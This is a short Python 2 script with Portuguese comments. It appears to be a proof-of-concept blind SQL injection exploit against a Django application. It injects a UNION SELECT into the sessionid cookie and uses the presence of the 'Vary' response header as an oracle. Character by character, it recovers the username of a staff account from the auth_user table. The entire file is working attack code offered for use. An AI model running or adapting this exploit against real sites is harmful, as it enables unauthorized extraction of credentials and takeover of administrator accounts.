# -*- ecoding:utf-8 -*-

import urllib2
from string import ascii_lowercase, digits

def inject(sql):
    """Injeta o commando SQL no cookie da requisição."""
    r = urllib2.Request("http://localhost")
    r.add_header("Cookie", "sessionid=' UNION %s" % sql.replace("\n", " ").strip())
    return urllib2.urlopen(r)

def verify(response):
    """Verifica a existência da variável cookie no cabecalho HTTP.
       Essa variável indica que a resposta é do django."""
    return "Vary" in response.headers

if __name__ == "__main__":
    username = ""
    max_number_of_django_auth_username = 30
    for interation in xrange(max_number_of_django_auth_username):
        for letter_or_digit in ascii_lowercase + digits + "@._":
            response = inject("SELECT CASE STRCMP(LOWER(SUBSTRING(username,%(i)d,1)),\
'%(char)s') WHEN 0 THEN CONCAT(email,'ABigDataHereFakeUserLoggedinABigDataHereABigDat\
aHer') ELSE email END FROM auth_user WHERE is_staff ORDER BY 1,'1" % {
            "char": letter_or_digit,
            "i": interation })
            if verify(response):
                username += letter_or_digit
                break
    print "username:", username
